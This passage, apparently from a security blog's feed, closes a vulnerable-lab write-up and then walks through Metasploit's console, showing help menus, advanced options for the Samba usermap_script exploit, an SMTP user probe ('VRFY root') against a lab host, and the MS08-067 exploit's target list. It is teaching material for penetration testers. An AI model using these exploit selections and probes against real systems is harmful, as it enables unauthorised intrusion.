<li><p>the hidden file was not so hidden in the <em>/var/www</em> directory</p></li>
<li><p>files in Bob&rsquo;s home folder were readable, allowing the decryption of the secret message</p></li>
</ul>


<p>The key takeaway for me was to start simple and build from there when testing stuff. I would have saved so much time if I had tried a simple PHP code execution test, instead of throwing reverse shells and scratching my head when it didn&rsquo;t work</p>

<p>And today, instead of a cookie, I leave here the picture that gets displayed when you go to a non existent page on the server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/drunkadmin/think.png" title="think" alt="hmm"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest tools - Metasploit]]></title>
    <link href="http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit/"/>
    <updated>2016-06-11T13:57:36-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/06/11/pentest-tools-metasploit</id>
    <content type="html"><![CDATA[<p>In this post I am going to focus on the use of Metasploit.</p>

<p>Before starting, I want to leave here some links to good resources for learning Metasploit:</p>

<p><a href="https://www.offensive-security.com/metasploit-unleashed/">Offensive Security Metasploit Unleashed free training course</a></p>

<p><a href="http://www.securitytube.net/groups?operation=view&amp;groupId=8">SecurityTube Metasploit Megaprimer</a></p>

<p><a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf">SANS Metasploit Cheatsheet</a></p>

<p><a href="http://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X?ie=UTF8&amp;*Version*=1&amp;*entries*=0">Metasploit: The Penetration Tester&rsquo;s Guide</a></p>

<!-- more -->


<h1>Msfconsole</h1>

<p>The <code>msfconsole</code> (Metasploit Framework Console) is where you will be spending most of your time when working with Metasploit. You can do almost everything from here, but the amount of commands might seem overwhelming at first.</p>

<p><img class="center" src="http://chousensha.github.io/images/tools/metasploit/msfbanner.png" title="msfconsole" alt="metasploit framework"></p>

<p>Besides the Metasploit functionality, you <strong>can run external commands in the console</strong>, which is really helpful.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; uname -a
</span><span class='line'>[*] exec: uname -a
</span><span class='line'>
</span><span class='line'>Linux pwnbox 4.0.0-kali1-amd64 #1 SMP Debian 4.0.4-1+kali2 (2015-06-03) x86_64 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>The first thing you probably want to do is look at the help menu:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; help
</span><span class='line'>
</span><span class='line'>Core Commands
</span><span class='line'>=============
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    ?             Help menu
</span><span class='line'>    advanced      Displays advanced options for one or more modules
</span><span class='line'>    back          Move back from the current context
</span><span class='line'>    banner        Display an awesome metasploit banner
</span><span class='line'>    cd            Change the current working directory
</span><span class='line'>    color         Toggle color
</span><span class='line'>    connect       Communicate with a host
</span><span class='line'>    edit          Edit the current module with $VISUAL or $EDITOR
</span><span class='line'>    exit          Exit the console
</span><span class='line'>    get           Gets the value of a context-specific variable
</span><span class='line'>    getg          Gets the value of a global variable
</span><span class='line'>    grep          Grep the output of another command
</span><span class='line'>    help          Help menu
</span><span class='line'>    info          Displays information about one or more modules
</span><span class='line'>    irb           Drop into irb scripting mode
</span><span class='line'>    jobs          Displays and manages jobs
</span><span class='line'>    kill          Kill a job
</span><span class='line'>    load          Load a framework plugin
</span><span class='line'>    loadpath      Searches for and loads modules from a path
</span><span class='line'>    makerc        Save commands entered since start to a file
</span><span class='line'>    options       Displays global options or for one or more modules
</span><span class='line'>    popm          Pops the latest module off the stack and makes it active
</span><span class='line'>    previous      Sets the previously loaded module as the current module
</span><span class='line'>    pushm         Pushes the active or list of modules onto the module stack
</span><span class='line'>    quit          Exit the console
</span><span class='line'>    reload_all    Reloads all modules from all defined module paths
</span><span class='line'>    rename_job    Rename a job
</span><span class='line'>    resource      Run the commands stored in a file
</span><span class='line'>    route         Route traffic through a session
</span><span class='line'>    save          Saves the active datastores
</span><span class='line'>    search        Searches module names and descriptions
</span><span class='line'>    sessions      Dump session listings and display information about sessions
</span><span class='line'>    set           Sets a context-specific variable to a value
</span><span class='line'>    setg          Sets a global variable to a value
</span><span class='line'>    show          Displays modules of a given type, or all modules
</span><span class='line'>    sleep         Do nothing for the specified number of seconds
</span><span class='line'>    spool         Write console output into a file as well the screen
</span><span class='line'>    threads       View and manipulate background threads
</span><span class='line'>    unload        Unload a framework plugin
</span><span class='line'>    unset         Unsets one or more context-specific variables
</span><span class='line'>    unsetg        Unsets one or more global variables
</span><span class='line'>    use           Selects a module by name
</span><span class='line'>    version       Show the framework and console library version numbers
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Every time you enter a new context, you can use <strong>help</strong> to see the options available for that context. For instance, after selecting an exploit:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; use exploit/linux/http/advantech_switch_bash_env_exec
</span><span class='line'>msf exploit(advantech_switch_bash_env_exec) &gt; help
</span><span class='line'>...
</span><span class='line'>Exploit Commands
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    check         Check to see if a target is vulnerable
</span><span class='line'>    exploit       Launch an exploit attempt
</span><span class='line'>    pry           Open a Pry session on the current module
</span><span class='line'>    rcheck        Reloads the module and checks if the target is vulnerable
</span><span class='line'>    reload        Just reloads the module
</span><span class='line'>    rerun         Alias for rexploit
</span><span class='line'>    rexploit      Reloads the module and launches an exploit attempt
</span><span class='line'>    run           Alias for exploit</span></code></pre></td></tr></table></div></figure>


<p>Or after setting a payload:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Payload Commands
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>    Command       Description
</span><span class='line'>    -------       -----------
</span><span class='line'>    check         Check to see if a target is vulnerable
</span><span class='line'>    generate      Generates a payload
</span><span class='line'>    pry           Open a Pry session on the current module
</span><span class='line'>    reload        Reload the current module from disk</span></code></pre></td></tr></table></div></figure>


<p>Many commands also have their own help menu that you can access by typing <code>help cmd</code> or by passing the -h switch: <code>cmd -h</code>. Let&rsquo;s now glance over some core commands</p>

<h2>Core commands</h2>

<ul>
<li><strong>advanced</strong> &ndash; shows advanced options for a module</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; advanced
</span><span class='line'>
</span><span class='line'>Module advanced options (exploit/multi/samba/usermap_script):
</span><span class='line'>
</span><span class='line'>   Name           : CHOST
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The local client address
</span><span class='line'>
</span><span class='line'>   Name           : CPORT
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The local client port
</span><span class='line'>
</span><span class='line'>   Name           : ConnectTimeout
</span><span class='line'>   Current Setting: 10
</span><span class='line'>   Description    : Maximum number of seconds to establish a TCP connection
</span><span class='line'>
</span><span class='line'>   Name           : ContextInformationFile
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The information file that contains context information
</span><span class='line'>
</span><span class='line'>   Name           : DisablePayloadHandler
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Disable the handler code for the selected payload
</span><span class='line'>
</span><span class='line'>   Name           : EnableContextEncoding
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Use transient context when encoding payloads
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::SendLM
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Always send the LANMAN response (except when NTLMv2_session is 
</span><span class='line'>      specified)
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::SendNTLM
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Activate the 'Negotiate NTLM key' flag, indicating the use of 
</span><span class='line'>      NTLM responses
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::SendSPN
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Send an avp of type SPN in the ntlmv2 client blob, this allows 
</span><span class='line'>      authentication on Windows 7+/Server 2008 R2+ when SPN is 
</span><span class='line'>      required
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::UseLMKey
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Activate the 'Negotiate Lan Manager Key' flag, using the LM key 
</span><span class='line'>      when the LM response is sent
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::UseNTLM2_session
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Activate the 'Negotiate NTLM2 key' flag, forcing the use of a 
</span><span class='line'>      NTLMv2_session
</span><span class='line'>
</span><span class='line'>   Name           : NTLM::UseNTLMv2
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : Use NTLMv2 instead of NTLM2_session when 'Negotiate NTLM2' key 
</span><span class='line'>      is true
</span><span class='line'>
</span><span class='line'>   Name           : Proxies
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>
</span><span class='line'>   Name           : SMB::ChunkSize
</span><span class='line'>   Current Setting: 500
</span><span class='line'>   Description    : The chunk size for SMB segments, bigger values will increase 
</span><span class='line'>      speed but break NT 4.0 and SMB signing
</span><span class='line'>
</span><span class='line'>   Name           : SMB::Native_LM
</span><span class='line'>   Current Setting: Windows 2000 5.0
</span><span class='line'>   Description    : The Native LM to send during authentication
</span><span class='line'>
</span><span class='line'>   Name           : SMB::Native_OS
</span><span class='line'>   Current Setting: Windows 2000 2195
</span><span class='line'>   Description    : The Native OS to send during authentication
</span><span class='line'>
</span><span class='line'>   Name           : SMB::VerifySignature
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Enforces client-side verification of server response signatures
</span><span class='line'>
</span><span class='line'>   Name           : SMBDirect
</span><span class='line'>   Current Setting: true
</span><span class='line'>   Description    : The target port is a raw SMB service (not NetBIOS)
</span><span class='line'>
</span><span class='line'>   Name           : SMBDomain
</span><span class='line'>   Current Setting: .
</span><span class='line'>   Description    : The Windows domain to use for authentication
</span><span class='line'>
</span><span class='line'>   Name           : SMBName
</span><span class='line'>   Current Setting: *SMBSERVER
</span><span class='line'>   Description    : The NetBIOS hostname (required for port 139 connections)
</span><span class='line'>
</span><span class='line'>   Name           : SMBPass
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The password for the specified username
</span><span class='line'>
</span><span class='line'>   Name           : SMBUser
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : The username to authenticate as
</span><span class='line'>
</span><span class='line'>   Name           : SSL
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Negotiate SSL for outgoing connections
</span><span class='line'>
</span><span class='line'>   Name           : SSLCipher
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : String for SSL cipher - "DHE-RSA-AES256-SHA" or "ADH"
</span><span class='line'>
</span><span class='line'>   Name           : SSLVerifyMode
</span><span class='line'>   Current Setting: PEER
</span><span class='line'>   Description    : SSL verification method (Accepted: CLIENT_ONCE, 
</span><span class='line'>      FAIL_IF_NO_PEER_CERT, NONE, PEER)
</span><span class='line'>
</span><span class='line'>   Name           : SSLVersion
</span><span class='line'>   Current Setting: TLS1
</span><span class='line'>   Description    : Specify the version of SSL/TLS to be used (TLS and SSL23 are 
</span><span class='line'>      auto-negotiate) (Accepted: SSL2, SSL3, SSL23, TLS, TLS1, TLS1.1, 
</span><span class='line'>      TLS1.2)
</span><span class='line'>
</span><span class='line'>   Name           : VERBOSE
</span><span class='line'>   Current Setting: false
</span><span class='line'>   Description    : Enable detailed status messages
</span><span class='line'>
</span><span class='line'>   Name           : WORKSPACE
</span><span class='line'>   Current Setting: 
</span><span class='line'>   Description    : Specify the workspace for this module
</span><span class='line'>
</span><span class='line'>   Name           : WfsDelay
</span><span class='line'>   Current Setting: 0
</span><span class='line'>   Description    : Additional delay when waiting for a session</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>back</strong> &ndash; allows you to go back from the current module</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(usermap_script) &gt; back
</span><span class='line'>msf &gt; </span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>connect</strong> &ndash; connect to a host on the specified port, like you would do with netcat</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; connect -h
</span><span class='line'>Usage: connect [options] &lt;host&gt; &lt;port&gt;
</span><span class='line'>
</span><span class='line'>Communicate with a host, similar to interacting via netcat, taking advantage of
</span><span class='line'>any configured session pivoting.
</span><span class='line'>
</span><span class='line'>OPTIONS:
</span><span class='line'>
</span><span class='line'>    -C        Try to use CRLF for EOL sequence.
</span><span class='line'>    -P &lt;opt&gt;  Specify source port.
</span><span class='line'>    -S &lt;opt&gt;  Specify source address.
</span><span class='line'>    -c &lt;opt&gt;  Specify which Comm to use.
</span><span class='line'>    -h        Help banner.
</span><span class='line'>    -i &lt;opt&gt;  Send the contents of a file.
</span><span class='line'>    -p &lt;opt&gt;  List of proxies to use.
</span><span class='line'>    -s        Connect with SSL.
</span><span class='line'>    -u        Switch to a UDP socket.
</span><span class='line'>    -w &lt;opt&gt;  Specify connect timeout.
</span><span class='line'>    -z        Just try to connect, then return.
</span><span class='line'>
</span><span class='line'>msf &gt; connect 192.168.80.156 25
</span><span class='line'>[*] Connected to 192.168.80.156:25
</span><span class='line'>220 metasploitable.localdomain ESMTP Postfix (Ubuntu)
</span><span class='line'>VRFY root
</span><span class='line'>252 2.0.0 root</span></code></pre></td></tr></table></div></figure>


<ul>
<li><strong>info</strong> &ndash; lists detailed information about a module, including description, vulnerable targets, payload information and more</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf &gt; info exploit/windows/smb/ms08_067_netapi
</span><span class='line'>
</span><span class='line'>       Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
</span><span class='line'>     Module: exploit/windows/smb/ms08_067_netapi
</span><span class='line'>   Platform: Windows
</span><span class='line'> Privileged: Yes
</span><span class='line'>    License: Metasploit Framework License (BSD)
</span><span class='line'>       Rank: Great
</span><span class='line'>  Disclosed: 2008-10-28
</span><span class='line'>
</span><span class='line'>Provided by:
</span><span class='line'>  hdm &lt;x@hdm.io&gt;
</span><span class='line'>  Brett Moore &lt;brett.moore@insomniasec.com&gt;
</span><span class='line'>  frank2 &lt;frank2@dc949.org&gt;
</span><span class='line'>  jduck &lt;jduck@metasploit.com&gt;
</span><span class='line'>
</span><span class='line'>Available targets:
</span><span class='line'>  Id  Name
</span><span class='line'>  --  ----
</span><span class='line'>  0   Automatic Targeting
</span><span class='line'>  1   Windows 2000 Universal
</span><span class='line'>  2   Windows XP SP0/SP1 Universal
</span><span class='line'>  3   Windows 2003 SP0 Universal
</span><span class='line'>  4   Windows XP SP2 English (AlwaysOn NX)
</span><span class='line'>  5   Windows XP SP2 English (NX)
</span><span class='line'>  6   Windows XP SP3 English (AlwaysOn NX)
</span><span class='line'>  7   Windows XP SP3 English (NX)
</span><span class='line'>  8   Windows XP SP2 Arabic (NX)
</span><span class='line'>  9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
</span><span class='line'>  10  Windows XP SP2 Chinese - Simplified (NX)
</span><span class='line'>  11  Windows XP SP2 Chinese - Traditional (NX)
</span><span class='line'>  12  Windows XP SP2 Czech (NX)
</span><span class='line'>  13  Windows XP SP2 Danish (NX)
</span><span class='line'>  14  Windows XP SP2 German (NX)
</span><span class='line'>  15  Windows XP SP2 Greek (NX)
</span><span class='line'>  16  Windows XP SP2 Spanish (NX)
</span><span class='line'>  17  Windows XP SP2 Finnish (NX)
</span><span class='line'>  18  Windows XP SP2 French (NX)
</span><span class='line'>  19  Windows XP SP2 Hebrew (NX)
</span><span class='line'>  20  Windows XP SP2 Hungarian (NX)
</span><span class='line'>  21  Windows XP SP2 Italian (NX)
</span><span class='line'>  22  Windows XP SP2 Japanese (NX)
</span><span class='line'>  23  Windows XP SP2 Korean (NX)
</span><span class='line'>  24  Windows XP SP2 Dutch (NX)
</span><span class='line'>  25  Windows XP SP2 Norwegian (NX)
</span><span class='line'>  26  Windows XP SP2 Polish (NX)
</span><span class='line'>  27  Windows XP SP2 Portuguese - Brazilian (NX)
</span><span class='line'>  28  Windows XP SP2 Portuguese (NX)
</span><span class='line'>  29  Windows XP SP2 Russian (NX)
</span><span class='line'>  30  Windows XP SP2 Swedish (NX)
</span><span class='line'>  31  Windows XP SP2 Turkish (NX)
</span><span class='line'>  32  Windows XP SP3 Arabic (NX)
</span><span class='line'>  33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
</span><span class='line'>  34  Windows XP SP3 Chinese - Simplified (NX)
</span><span class='line'>  35  Windows XP SP3 Chinese - Traditional (NX)
</span><span class='line'>  36  Windows XP SP3 Czech (NX)
</span><span class='line'>  37  Windows XP SP3 Danish (NX)
</span><span class='line'>  38  Windows XP SP3 German (NX)
</span><span class='line'>  39  Windows XP SP3 Greek (NX)
</span><span class='line'>  40  Windows XP SP3 Spanish (NX)
</span><span class='line'>  41  Windows XP SP3 Finnish (NX)
</span><span class='line'>  42  Windows XP SP3 French (NX)
</span><span class='line'>  43  Windows XP SP3 Hebrew (NX)
</span><span class='line'>  44  Windows XP SP3 Hungarian (NX)
</span><span class='line'>  45  Windows XP SP3 Italian (NX)
</span><span class='line'>  46  Windows XP SP3 Japanese (NX)
</span><span class='line'>  47  Windows XP SP3 Korean (NX)
</span><span class='line'>  48  Windows XP SP3 Dutch (NX)
</span><span class='line'>  49  Windows XP SP3 Norwegian (NX)
</span><span class='line'>  50  Windows XP SP3 Polish (NX)
</span><span class='line'>  51  Windows XP SP3 Portuguese - Brazilian (NX)
</span><span class='line'>  52  Windows XP SP3 Portuguese (NX)
</span><span class='line'>  53  Windows XP SP3 Russian (NX)
</span><span class='line'>  54  Windows XP SP3 Swedish (NX)
</span><span class='line'>  55  Windows XP SP3 Turkish (NX)
</span><span class='line'>  56  Windows 2003 SP1 English (NO NX)
</span><span class='line'>  57  Windows 2003 SP1 English (NX)
</span><span class='line'>  58  Windows 2003 SP1 Japanese (NO NX)
</span><span class='line'>  59  Windows 2003 SP1 Spanish (NO NX)
</span><span class='line'>  60  Windows 2003 SP1 Spanish (NX)
</span><span class='line'>  61  Windows 2003 SP1 French (NO NX)
</span><span class='line'>  62  Windows 2003 SP1 French (NX)
</span><span class='line'>  63  Windows 2003 SP2 English (NO NX)
</span><span class='line'>  64  Windows 2003 SP2 English (NX)
</span><span class='line'>  65  Windows 2003 SP2 German (NO NX)
</span><span class='line'>  66  Windows 2003 SP2 German (NX)
</span><span class='line'>  67  Windows 2003 SP2 Portuguese - Brazilian (NX)
</span><span class='line'>  68  Windows 2003 SP2 Spanish (NO NX)
</span><span class='line'>  69  Windows 2003 SP2 Spanish (NX)
</span><span class='line'>  70  Windows 2003 SP2 Japanese (NO NX)
</span><span class='line'>  71  Windows 2003 SP2 French (NO NX)
</span><span class='line'>  72  Windows 2003 SP2 French (NX)
</span><span class='line'>
</span><span class='line'>Basic options:
